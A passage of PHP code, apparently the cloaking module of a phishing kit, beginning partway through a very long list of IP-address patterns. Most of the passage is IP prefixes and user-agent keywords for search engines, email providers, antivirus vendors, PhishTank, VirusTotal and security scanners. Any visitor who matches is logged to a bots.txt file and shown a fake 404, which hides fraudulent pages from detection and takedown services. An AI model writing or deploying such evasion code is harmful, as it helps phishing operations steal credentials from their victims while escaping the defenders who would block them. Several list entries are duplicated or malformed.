         "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*",
         "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*",
         "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*",
         "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*",
         "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*",
         "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*",
         "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*",
        "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*",
        "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*",
        "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*",
         "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*",
        "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*",
         "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*",
         "^66.211.169.3", "^66.211.169.66", "^89.163.159.214", "^37.128.131.171",
        "^12.148.196.*", "^193.220.178.*", "^68.65.53.71", "^198.25.*.*", "^64.106.213.*",
        "^104.108.64.175","104.83.233.198", "^173.194.116.102","^173.194.112.*",
        "^65.55.206.154", "^193.221.113.53", "^208.76.45.53", "^208.84.*.*",
        "^207.46.8.167", "^65.54.188.110", "^207.46.8.199", "^134.170.2.199", "^65.55.92.152",
        "^65.54.188.94", "^65.55.37.104", "^65.55.92.168", "^65.55.37.120", "^65.55.33.119",
        "^65.55.92.184", "^65.54.188.126","^65.55.37.88", "^65.55.37.88", "^65.55.92.136",
        "^207.46.8.199", "^65.55.92.168", "^65.54.188.94", "^65.55.33.119", "^65.55.37.104",
        "^65.54.188.110", "^65.55.37.72", "^65.55.92.152", "^207.46.8.167", "^65.55.33.135",
        "^134.170.2.199", "^65.55.85.12", "^173.194.116.149", "^216.58.211.37" ,
        "^89.163.159.214", "^64.233.*.*", "^66.102.*.*", "^66.249.*.*", "^216.239.*.*" , "^216.33.229.163" ,
        "^64.233.173.*" , "^64.68.90.*",
        "^66.102.*.*",
             "^38.100.*.*",
             "^107.170.*.*",
             "^149.20.*.*",
             "^38.105.*.*",
             "^74.125.*.*",
             "^66.150.14.*",
             "^54.176.*.*",
             "^38.100.*.*",
             "^184.173.*.*",
             "^66.249.*.*",
             "^128.242.*.*",
             "^72.14.192.*",
             "^208.65.144.*",
             "^74.125.*.*",
             "^209.85.128.*",
             "^216.239.32.*",
             "^74.125.*.*",
             "^207.126.144.*",
             "^173.194.*.*",
             "^64.233.160.*",
             "^72.14.192.*",
             "^66.102.*.*",
             "^64.18.*.*",
             "^194.52.68.*",
             "^194.72.238.*",
             "^62.116.207.*",
             "^212.50.193.*",
             "^69.65.*.*",
             "^50.7.*.*",
             "^131.212.*.*",
             "^46.116.*.* ",
             "^62.90.*.*",
             "^89.138.*.*",
             "^82.166.*.*",
             "^85.64.*.*",
             "^85.250.*.*",
             "^89.138.*.*",
             "^93.172.*.*",
             "^109.186.*.*",
             "^194.90.*.*",
             "^212.29.192.*",
             "^212.29.224.*",
             "^212.143.*.*",
             "^212.150.*.*",
             "^212.235.*.*",
             "^217.132.*.*",
             "^50.97.*.*",
             "^217.132.*.*",
             "^209.85.*.*",
             "^66.205.64.*",
             "^204.14.48.*",
             "^64.27.2.*",
             "^67.15.*.*",
             "^202.108.252.*",
             "^193.47.80.*",
             "^64.62.136.*",
             "^66.221.*.*",
             "^64.62.175.*",
             "^198.54.*.*",
             "^192.115.134.*",
             "^216.252.167.*",
             "^193.253.199.*",
             "^69.61.12.*",
             "^64.37.103.*",
             "^38.144.36.*",
             "^64.124.14.*",
             "^206.28.72.*",
             "^209.73.228.*",
             "^158.108.*.*",
             "^168.188.*.*",
             "^66.207.120.*",
             "^167.24.*.*",
             "^192.118.48.*",
             "^67.209.128.*",
             "^12.148.209.*",
             "^12.148.196.*",
             "^193.220.178.*",
             "68.65.53.71",
             "^198.25.*.*",
             "^64.106.213.*",
             "^54.228.218.117",
             "^54.228.218.*",
             "^185.28.20.243",
             "^185.28.20.*",
             "^217.16.26.166",
             "^217.16.26.*
             ^206.207.*.*", "^209.19.*.*", "^207.70.*.*", "^185.75.*.*", "^193.226.*.*", "^66.102.*.*", "^64.71.*.*", "^69.164.*.*", "^64.74.*.*", "^64.235.*.*", "^4.14.64.*.*", "^4.14.64.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^72.13.86.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*",  "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "^68.65.53.71", "^198.25.*.*", "^4.14.0.0",
             "^206.207.*.*",
         "^209.19.*.*",
         "^207.70.*.*",
         "^185.75.*.*",
         "^193.226.*.*",
         "^66.102.*.*",
         "^64.71.*.*",
         "^69.164.*.*",
         "^64.74.*.*",
         "^64.235.*.*",
         "^4.14.64.*.*",
         "^4.14.64.*",
         "^38.100.*.*",
         "^107.170.*.*",
         "^149.20.*.*",
         "^38.105.*.*",
         "^74.125.*.*",
          "^66.150.14.*",
         "^54.176.*.*",
         "^38.100.*.*",
         "^184.173.*.*",
         "^66.249.*.*",
         "^128.242.*.*",
         "^72.14.192.*",
         "^72.13.86.*",
         "^208.65.144.*",
         "^74.125.*.*",
         "^209.85.128.*",
         "^216.239.32.*",
         "^74.125.*.*",
         "^207.126.144.*",
         "^173.194.*.*",
         "^64.233.160.*",
         "^72.14.192.*",
         "^66.102.*.*",
         "^64.18.*.*",
         "^194.52.68.*",
         "^194.72.238.*",
         "^62.116.207.*",
         "^212.50.193.*",
         "^69.65.*.*",
         "^131.212.*.*",
         "^46.116.*.* ",
         "^62.90.*.*",
         "^89.138.*.*",
         "^82.166.*.*",
         "^85.64.*.*",
         "^85.250.*.*",
         "^89.138.*.*",
         "^93.172.*.*",
         "^109.186.*.*",
         "^194.90.*.*",
         "^212.29.192.*",
         "^212.29.224.*",
         "^212.143.*.*",
         "^212.150.*.*",
         "^212.235.*.*",
         "^217.132.*.*",
         "^50.97.*.*",
         "^217.132.*.*",
         "^209.85.*.*",
         "^66.205.64.*",
         "^204.14.48.*",
          "^64.27.2.*",
         "^67.15.*.*",
         "^202.108.252.*",
         "^193.47.80.*",
         "^64.62.136.*",
         "^66.221.*.*",
         "^64.62.175.*",
         "^198.54.*.*",
         "^192.115.134.*",
         "^216.252.167.*",
         "^193.253.199.*",
         "^69.61.12.*",
         "^64.37.103.*",
         "^38.144.36.*",
         "^64.124.14.*",
         "^206.28.72.*",
         "^209.73.228.*",
         "^158.108.*.*",
         "^168.188.*.*",
         "^66.207.120.*",
         "^167.24.*.*",
         "^192.118.48.*",
         "^67.209.128.*",
         "^12.148.209.*",
         "^12.148.196.*",
         "^193.220.178.*",
         "^68.65.53.71",
         "^198.25.*.*",
         "^4.14.0.0",
             '^104.236.153.*',
            '^107.170.*.*',
            '^64.71.206.*',
            '^64.71.205.*',
            '^64.71.204.*',
            '^66.102.8.*',
            '^157.55.39.*',
            '^105.107.79.*',
            '^4.14.64.*',
            '^64.74.215.*',
            '^198.186.190.*',
            '^198.186.191.*',
            '^198.186.192.*',
            '^198.186.193.*',
            '^109.186.*.*',
            '^12.148.196.*',
            '^12.148.209.*',
            '^128.242.*.*',
            '^131.212.*.*',
            '^149.20.*.*',
            '^158.108.*.*',
            '^163.195.178.*',
            '^167.24.*.*',
            '^168.188.*.*',
            '^173.194.*.*',
            '^173.224.160.*',
            '^173.224.161.*',
            '^173.224.162.*',
            '^173.224.163.*',
            '^173.224.164.*',
            '^173.224.165.*',
            '^173.224.166.*',
            '^173.224.167.*',
            '^184.173.*.*',
            '^192.115.134.*',
            '^192.118.48.*',
            '^193.220.178.*',
            '^193.253.199.*',
            '^193.47.80.*',
            '^194.52.68.*',
            '^194.72.238.*',
            '^194.90.*.*',
            '^198.25.*.*',
            '^198.54.*.*',
            '^199.30.228.*',
            '^202.108.252.*',
            '^204.14.48.*',
            '^206.28.72.*',
            '^207.126.144.*',
            '^208.65.144.*',
            '^208.91.115.*',
            '^209.73.228.*',
            '^209.85.*.*',
            '^209.85.128.*',
            '^212.143.*.*',
            '^212.150.*.*',
            '^212.235.*.*',
            '^212.29.192.*',
            '^212.29.224.*',
            '^212.50.193.*',
            '^216.10.193.*',
            '^216.239.32.*',
            '^216.252.167.*',
            '^217.132.*.*',
            '^217.132.*.*',
            '^38.100.*.*',
            '^38.100.*.*',
            '^38.105.*.*',
            '^38.144.36.*',
            '^46.116.*.* ',
            '^50.7.*.*',
            '^50.97.*.*',
            '^54.176.*.*',
            '^62.116.207.*',
            '^62.90.*.*',
            '^64.106.213.*',
            '^64.124.14.*',
            '^64.18.*.*',
            '^64.233.160.*',
            '^64.27.2.*',
            '^64.37.103.*',
            '^64.62.136.*',
            '^64.62.175.*',
            '^66.102.*.*',
            '^66.102.*.*',
            '^66.135.200.*',
            '^66.150.14.*',
            '^66.205.64.*',
            '^66.207.120.*',
            '^66.221.*.*',
            '^66.249.*.*',
            '^67.15.*.*',
            '^67.209.128.*',
            '^68.65.53.71',
            '^69.61.12.*',
            '^69.65.*.*',
            '^72.14.192.*',
            '^72.14.192.*',
            '^74.125.*.*',
            '^74.125.*.*',
            '^74.125.*.*',
            '^81.161.59.*',
            '^82.166.*.*',
            '^85.250.*.*',
            '^85.64.*.*',
            '^89.138.*.*',
            '^89.138.*.*',
            '^91.103.66.*',
            '^93.172.*.*',
            "^81.161.59.*",
        "^66.135.200.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*", "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*", "^91.103.66.*", "^208.91.115.*", "^199.30.228.*","^66.102.*.*","^104.236.153.*","^65.55.85.12","^66.211.169.3", "^66.211.169.66", "^89.163.159.214", "^37.128.131.171",
        "^12.148.196.*", "^193.220.178.*", "^68.65.53.71", "^198.25.*.*", "^64.106.213.*",
        "^104.108.64.175","104.83.233.198", "^173.194.116.102","^173.194.112.*",
        "^65.55.206.154", "^193.221.113.53", "^208.76.45.53", "^208.84.*.*",
        "^207.46.8.167", "^65.54.188.110", "^207.46.8.199", "^134.170.2.199", "^65.55.92.152",
        "^65.54.188.94", "^65.55.37.104", "^65.55.92.168", "^65.55.37.120", "^65.55.33.119",
        "^65.55.92.184", "^65.54.188.126","^65.55.37.88", "^65.55.37.88", "^65.55.92.136",
        "^207.46.8.199", "^65.55.92.168", "^65.54.188.94", "^65.55.33.119", "^65.55.37.104",
        "^65.54.188.110","^1.128.96.181","^65.208.151.*","^1.132.97.75","^1.152.96.223",
        "^38.100.*.*","^185.20.5.*","^185.20.4.*","^95.76.156.*","^216.58.211.37","^173.194.116.149",
        "^107.170.*.*","^64.68.90.*","^64.233.173.*","^216.33.229.163","^216.239.*.*","^89.163.159.214",
        "^149.20.*.*","^219.117.238.170","^79.79.148.223","^62.149.225.67","^104.131.165.123","^46.101.249.238","^79.79.147.162","^178.62.113.173","^1.152.97.32","^101.174.147.73","27.54.62.91","4.14.64.*",
        "^38.105.*.*",
        "^74.125.*.*",
        "^66.150.14.*",
        "^54.176.*.*",
        "^38.100.*.*",
        "^184.173.*.*",
        "^66.249.*.*",
        "^128.242.*.*",
        "^72.14.192.*",
        "^208.65.144.*",
        "^74.125.*.*",
        "^209.85.128.*",
        "^216.239.32.*",
        "^74.125.*.*",
        "^207.126.144.*",
        "^173.194.*.*",
        "^64.233.160.*",
        "^72.14.192.*",
        "^66.102.*.*",
        "^64.18.*.*",
        "^194.52.68.*",
        "^194.72.238.*",
        "^62.116.207.*",
        "^212.50.193.*",
        "^69.65.*.*",
        "^50.7.*.*",
        "^131.212.*.*",
        "^46.116.*.* ",
        "^62.90.*.*",
        "^89.138.*.*",
        "^82.166.*.*",
        "^85.64.*.*",
        "^85.250.*.*",
        "^89.138.*.*",
        "^93.172.*.*",
        "^109.186.*.*",
        "^194.90.*.*",
        "^212.29.192.*",
        "^212.29.224.*",
        "^212.143.*.*",
        "^212.150.*.*",
        "^212.235.*.*",
        "^217.132.*.*",
        "^50.97.*.*",
        "^217.132.*.*",
        "^209.85.*.*",
        "^66.205.64.*",
        "^204.14.48.*",
        "^64.27.2.*",
        "^67.15.*.*",
        "^202.108.252.*",
        "^193.47.80.*",
        "^64.62.136.*",
        "^66.221.*.*",
        "^64.62.175.*",
        "^198.54.*.*",
        "^192.115.134.*",
        "^216.252.167.*",
        "^193.253.199.*",
        "^69.61.12.*",
        "^64.37.103.*",
        "^38.144.36.*",
        "^64.124.14.*",
        "^206.28.72.*",
        "^209.73.228.*",
        "^158.108.*.*",
        "^168.188.*.*",
        "^66.207.120.*",
        "^167.24.*.*",
        "^192.118.48.*",
        "^67.209.128.*",
        "^12.148.209.*",
        "^12.148.196.*",
        "^193.220.178.*",
        "^68.65.53.71",
        "^64.235.153.*","^64.235.154.*",
        "^198.25.*.*",
        "^64.106.213.*",
        "54.228.218.117",
        "^54.228.218.*",
        "185.28.20.243",
        "^185.28.20.*",
        "217.16.26.166",
        "162.224.156.32",
        "^204.101.161.159",
        "^217.16.26.*",
        "^216.162.209.*",
        "^64.71.193.*",
        "^185.75.141.32",
        "^209.66.70.*",
        "^207.70.60.*",
        "^209.19.185.*",
        "^209.*",
        "^104.236.153.*",
        "^107.170.*.*",
        "^109.186.*.*",
        "^12.148.196.*",
        "^12.148.209.*",
        "^128.242.*.*",
        "^131.212.*.*",
        "^149.20.*.*",
        "^158.108.*.*",
        "^163.195.178.*",
        "^167.24.*.*",
        "^168.188.*.*",
        "^173.194.*.*",
        "^173.224.160.*",
        "^173.224.161.*",
        "^173.224.162.*",
        "^173.224.163.*",
        "^173.224.164.*",
        "^173.224.165.*",
        "^173.224.166.*",
        "^173.224.167.*",
        "^184.173.*.*",
        "^192.115.134.*",
        "^192.118.48.*",
        "^193.220.178.*",
        "^193.253.199.*",
        "^193.47.80.*",
        "^194.52.68.*",
        "^194.72.238.*",
        "^194.90.*.*",
        "^198.25.*.*",
        "^198.54.*.*",
        "^199.30.228.*",
        "^202.108.252.*",
        "^204.14.48.*",
        "^206.28.72.*",
        "^207.126.144.*",
        "^208.65.144.*",
        "^208.91.115.*",
        "^209.73.228.*",
        "^209.85.*.*",
        "^209.85.128.*",
        "^212.143.*.*",
        "^212.150.*.*",
        "^212.235.*.*",
        "^212.29.192.*",
        "^212.29.224.*",
        "^212.50.193.*",
        "^216.10.193.*",
        "^216.239.32.*",
        "^216.252.167.*",
        "^217.132.*.*",
        "^217.132.*.*",
        "^38.100.*.*",
        "^38.100.*.*",
        "^38.105.*.*",
        "^38.144.36.*",
        "^46.116.*.* ",
        "^50.7.*.*",
        "^50.97.*.*",
        "^54.176.*.*",
        "^62.116.207.*",
        "^62.90.*.*",
        "^64.106.213.*",
        "^64.124.14.*",
        "^64.18.*.*",
        "^64.233.160.*",
        "^64.27.2.*",
        "^64.37.103.*",
        "^64.62.136.*",
        "^64.62.175.*",
        "^66.102.*.*",
        "^66.102.*.*",
        "^66.135.200.*",
        "^66.150.14.*",
        "^66.205.64.*",
        "^66.207.120.*",
        "^66.221.*.*",
        "^66.249.*.*",
        "^67.15.*.*",
        "^67.209.128.*",
        "^68.65.53.71",
        "^69.61.12.*",
        "^69.65.*.*",
        "^72.14.192.*",
        "^72.14.192.*",
        "^74.125.*.*",
        "^74.125.*.*",
        "^74.125.*.*",
        "^81.161.59.*",
        "^82.166.*.*",
        "^85.250.*.*",
        "^85.64.*.*",
        "^89.138.*.*",
        "^89.138.*.*",
        "^91.103.66.*",
        "^93.172.*.*",
        "^95.76.156.*",
        "^64.71.*.*",
        "^203.188.221.*",
        "^209.19.186.231",
        "^206.207.80.*",
        "^209.19.*.*",
        "^206.80.*.*",
        "^207.80.*.*",
        "^207.70.60.*",
        "^108.210.106.*",
        "^173.14.18.*",
        "^52.90.*.*",
        "^35.172.115.*",
        "^54.164.*.*",
        "^222.154.252.*",
        "^195.211.23.*",
        "^13.57.36.*",
        "^210.55.200.*",
        "^42.112.8.*"
        );
        
            foreach($ips as $ip) {
                if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
        
                    $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Blacklist ] \r\n";
                    $save=fopen("../../bots.txt","a+");
                    fwrite($save,$content);
                    fclose($save);
                    header("HTTP/1.0 404 Not Found");exit();
        
                }
            }
        
        $dp =  strtolower($_SERVER['HTTP_USER_AGENT']);
        $blocked_words = array(
             "bot",
             "above",
             "google",
             "docomo",
             "mediapartners",
             "phantomjs",
             "lighthouse",
             "reverseshorturl",
             "samsung-sgh-e250",
             "softlayer",
             "amazonaws",
             "cyveillance",
             "crawler",
             "gsa-crawler",
             "phishtank",
             "dreamhost",
             "netpilot",
             "calyxinstitute",
             "tor-exit",
             "apache-httpclient",
             "lssrocketcrawler",
             "crawler",
             "urlredirectresolver",
             "jetbrains",
             "spam",
             "windows 95",
             "windows 98",
             "acunetix",
             "netsparker",
             "007ac9",
             "008",
             "Feedfetcher",
             "192.comagent",
             "200pleasebot",
             "360spider",
             "4seohuntbot",
             "50.nu",
             "a6-indexer",
             "admantx",
             "amznkassocbot",
             "aboundexbot",
             "aboutusbot",
             "abrave spider",
             "accelobot",
             "acoonbot",
             "addthis.com",
             "adsbot-google",
             "ahrefsbot",
             "alexabot",
             "amagit.com",
             "analytics",
             "antbot",
             "apercite",
             "aportworm",
             "EBAY",
             "CL0NA",
             "jabber",
             "ebay",
             "arabot",
             "hotmail!",
             "msn!",
             "baidu",
             "outlook!",
             "outlook",
             "msn",
             "duckduckbot",
             "hotmail",
             "go-http-client",
             "go-http-client/1.1",
             "trident",
             "presto",
             "virustotal",
             "unchaos",
             "dreampassport",
             "sygol",
             "nutch",
             "privoxy",
             "zipcommander",
             "neofonie",
             "abacho",
             "acoi",
             "acoon",
             "adaxas",
             "agada",
             "aladin",
             "alkaline",
             "amibot",
             "anonymizer",
             "aplix",
             "aspseek",
             "avant",
             "baboom",
             "anzwers",
             "anzwerscrawl",
             "crawlconvera",
             "del.icio.us",
             "camehttps",
             "annotate",
             "wapproxy",
             "translate",
             "feedfetcher",
             "ask24",
             "asked",
             "askaboutoil",
             "fangcrawl",
             "amzn_assoc",
             "bingpreview",
             "dr.web",
             "drweb",
             "bilbo",
             "blackwidow",
             "sogou",
             "sogou-test-spider",
             "exabot",
             "externalhit",
             "ia_archiver",
             "googletranslate",
             "translate",
             "proxy",
             "dalvik",
             "quicklook",
             "seamonkey",
             "sylera",
             "safebrowsing",
             "safesurfingwidget",
             "preview",
             "whatsapp",
             "telegram",
             "instagram",
             "zteopen",
             "icoreservice",
             "untrusted"
        
        );
            foreach($blocked_words as $word2) {
                if (substr_count($dp, strtolower($word2)) > 0 or $dp == "" or $dp == " " or $dp == "    ") {
        
                    $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Bad words ] \r\n";
                    $save=fopen("../../bots.txt","a+");
                    fwrite($save,$content);
                    fclose($save);
                    header("HTTP/1.0 404 Not Found");exit();
        
                }
            }
        
        $Bot = array(
            "abot",
            "dbot",
            "ebot",
            "hbot",
            "kbot",
            "lbot",
            "mbot",
            "nbot",
            "obot",
            "pbot",
            "rbot",
            "sbot",
            "tbot",
            "vbot",
            "ybot",
            "zbot",
            "bot.",
            "bot/",
            "_bot",
            ".bot",
            "/bot",
            "-bot",
            ":bot",
            "(bot",
            "crawl",
            "slurp",
            "spider",
            "seek",
            "avg",
            "avira",
            "bitdefender",
            "kaspersky",
            "sophos",
            "virustotal",
            "virus",
            "accoona",
            "acoon",
            "adressendeutschland",
            "ah-ha.com",
            "ahoy",
            "altavista",
            "ananzi",
            "anthill",
            "appie",
            "arachnophilia",
            "arale",
            "araneo",
            "aranha",
            "architext",
            "aretha",
            "arks",
            "asterias",
            "atlocal",
            "atn",
            "atomz",
            "augurfind",
            "backrub",
            "bannana_bot",
            "baypup",
            "bdfetch",
            "big brother",
            "biglotron",
            "bjaaland",
            "blackwidow",
            "blaiz",
            "blog",
            "blo.",
            "bloodhound",
            "boitho",
            "booch",
            "bradley",
            "butterfly",
            "calif",
            "cassandra",
            "ccubee",
            "cfetch",
            "charlotte",
            "churl",
            "cienciaficcion",
            "cmc",
            "collective",
            "comagent",
            "combine",
            "computingsite",
            "csci",
            "curl",
            "cusco",
            "daumoa",
            "deepindex",
            "delorie",
            "depspid",
            "deweb",
            "die blinde kuh",
            "digger",
            "ditto",
            "dmoz",
            "docomo",
            "download express",
            "dtaagent",
            "dwcp",
            "ebiness",
            "ebingbong",
            "e-collector",
            "ejupiter",
            "emacs-w3 search engine",
            "esther",
            "evliya celebi",
            "ezresult",
            "falcon",
            "felix ide",
            "ferret",
            "fetchrover",
            "fido",
            "findlinks",
            "fireball",
            "fish search",
            "fouineur",
            "funnelweb",
            "gazz",
            "gcreep",
            "genieknows",
            "getterroboplus",
            "geturl",
            "glx",
            "goforit",
            "golem",
            "grabber",
            "grapnel",
            "gralon",
            "griffon",
            "gromit",
            "grub",
            "gulliver",
            "hamahakki",
            "harvest",
            "havindex",
            "helix",
            "heritrix",
            "hku www octopus",
            "homerweb",
            "htdig",
            "html index",
            "html_analyzer",
            "htmlgobble",
            "hubater",
            "hyper-decontextualizer",
            "ia_archiver",
            "ibm_planetwide",
            "ichiro",
            "iconsurf",
            "iltrovatore",
            "image.kapsi.net",
            "imagelock",
            "incywincy",
            "indexer",
            "infobee",
            "informant",
            "ingrid",
            "inktomisearch.com",
            "inspector web",
            "intelliagent",
            "internet shinchakubin",
            "ip3000",
            "iron33",
            "israeli-search",
            "ivia",
            "jack",
            "jakarta",
            "javabee",
            "jetbot",
            "jumpstation",
            "katipo",
            "kdd-explorer",
            "kilroy",
            "knowledge",
            "kototoi",
            "kretrieve",
            "labelgrabber",
            "lachesis",
            "larbin",
            "legs",
            "libwww",
            "linkalarm",
            "link validator",
            "linkscan",
            "lockon",
            "lwp",
            "lycos",
            "magpie",
            "mantraagent",
            "mapoftheinternet",
            "marvin/",
            "mattie",
            "mediafox",
            "mediapartners",
            "mercator",
            "merzscope",
            "microsoft url control",
            "minirank",
            "miva",
            "mj12",
            "mnogosearch",
            "moget",
            "monster",
            "moose",
            "motor",
            "multitext",
            "muncher",
            "muscatferret",
            "mwd.search",
            "myweb",
            "najdi",
            "nameprotect",
            "nationaldirectory",
            "nazilla",
            "ncsa beta",
            "nec-meshexplorer",
            "nederland.zoek",
            "netcarta webmap engine",
            "netmechanic",
            "netresearchserver",
            "netscoop",
            "newscan-online",
            "nhse",
            "nokia6682/",
            "nomad",
            "noyona",
            "siteexplorer",
            "nutch",
            "nzexplorer",
            "objectssearch",
            "occam",
            "omni",
            "open text",
            "openfind",
            "openintelligencedata",
            "orb search",
            "osis-project",
            "pack rat",
            "pageboy",
            "pagebull",
            "page_verifier",
            "panscient",
            "parasite",
            "partnersite",
            "patric",
            "pear.",
            "pegasus",
            "peregrinator",
            "pgp key agent",
            "phantom",
            "phpdig",
            "picosearch",
            "piltdownman",
            "pimptrain",
            "pinpoint",
            "pioneer",
            "piranha",
            "plumtreewebaccessor",
            "pogodak",
            "poirot",
            "pompos",
            "poppelsdorf",
            "poppi",
            "popular iconoclast",
            "psycheclone",
            "publisher",
            "python",
            "rambler",
            "raven search",
            "roach",
            "road runner",
            "roadhouse",
            "robbie",
            "robofox",
            "robozilla",
            "rules",
            "salty",
            "sbider",
            "scooter",
            "scoutjet",
            "scrubby",
            "search.",
            "searchprocess",
            "semanticdiscovery",
            "senrigan",
            "sg-scout",
            "shai'hulud",
            "shark",
            "shopwiki",
            "sidewinder",
            "sift",
            "silk",
            "simmany",
            "site searcher",
            "site valet",
            "sitetech-rover",
            "skymob.com",
            "sleek",
            "smartwit",
            "sna-",
            "snappy",
            "snooper",
            "sohu",
            "speedfind",
            "sphere",
            "sphider",
            "spinner",
            "spyder",
            "steeler/",
            "suke",
            "suntek",
            "supersnooper",
            "surfnomore",
            "sven",
            "sygol",
            "szukacz",
            "tach black widow",
            "tarantula",
            "templeton",
            "/teoma",
            "t-h-u-n-d-e-r-s-t-o-n-e",
            "theophrastus",
            "titan",
            "titin",
            "tkwww",
            "toutatis",
            "t-rex",
            "tutorgig",
            "twiceler",
            "twisted",
            "ucsd",
            "udmsearch",
            "url check",
            "updated",
            "vagabondo",
            "valkyrie",
            "verticrawl",
            "victoria",
            "vision-search",
            "volcano",
            "voyager/",
            "voyager-hc",
            "w3c_validator",
            "w3m2",
            "w3mir",
            "walker",
            "wallpaper",
            "wanderer",
            "wauuu",
            "wavefire",
            "web core",
            "web hopper",
            "web wombat",
            "webbandit",
            "webcatcher",
            "webcopy",
            "webfoot",
            "weblayers",
            "weblinker",
            "weblog monitor",
            "webmirror",
            "webmonkey",
            "webquest",
            "webreaper",
            "websitepulse",
            "websnarf",
            "webstolperer",
            "webvac",
            "webwalk",
            "webwatch",
            "webwombat",
            "webzinger",
            "wget",
            "whizbang",
            "whowhere",
            "wild ferret",
            "worldlight",
            "wwwc",
            "wwwster",
            "xenu",
            "xget",
            "xift",
            "xirq",
            "yandex",
            "yanga",
            "yeti",
            "yodao",
            "zao/",
            "zippp",
            "zyborg",
            "proximic",
            "Googlebot",
            "Baiduspider",
            "Cliqzbot",
            "A6-Indexer",
            "AhrefsBot",
            "Genieo",
            "BomboraBot",
            "CCBot",
            "URLAppendBot",
            "DomainAppender",
            "msnbot-media",
            "Antivirus",
            "YoudaoBot",
            "MJ12bot",
            "linkdexbot",
            "Go-http-client",
            "presto",
            "BingPreview",
            "go-http-client",
             "go-http-client/1.1",
             "trident",
             "presto",
             "virustotal",
             "unchaos",
             "dreampassport",
             "sygol",
             "nutch",
             "privoxy",
             "zipcommander",
             "neofonie",
             "abacho",
             "acoi",
             "acoon",
             "adaxas",
             "agada",
             "aladin",
             "alkaline",
             "amibot",
             "anonymizer",
             "aplix",
             "aspseek",
             "avant",
             "baboom",
             "anzwers",
             "anzwerscrawl",
             "crawlconvera",
             "del.icio.us",
             "camehttps",
             "annotate",
             "wapproxy",
             "translate",
             "feedfetcher",
             "ask24",
             "asked",
             "askaboutoil",
             "fangcrawl",
             "amzn_assoc",
             "bingpreview",
             "dr.web",
             "drweb",
             "bilbo",
             "blackwidow",
             "sogou",
             "sogou-test-spider",
             "exabot",
             "externalhit",
             "ia_archiver",
             "mj12",
             "okhttp",
             "simplepie",
             "curl",
             "wget",
             "virus",
             "pipes",
             "antivirus",
             "python",
             "ruby",
             "avast",
             "firebird",
             "scmguard",
             "adsbot",
             "weblight",
             "favicon",
             "analytics",
             "insights",
             "headless",
             "github",
             "node",
             "agusescan",
             "zteopen",
             "majestic12",
             "SimplePie",
             "SAMSUNG-SGH-E250",
             "DoCoMo/2.0 N905i",
             "SiteLockSpider",
             "okhttp/2.5.0",
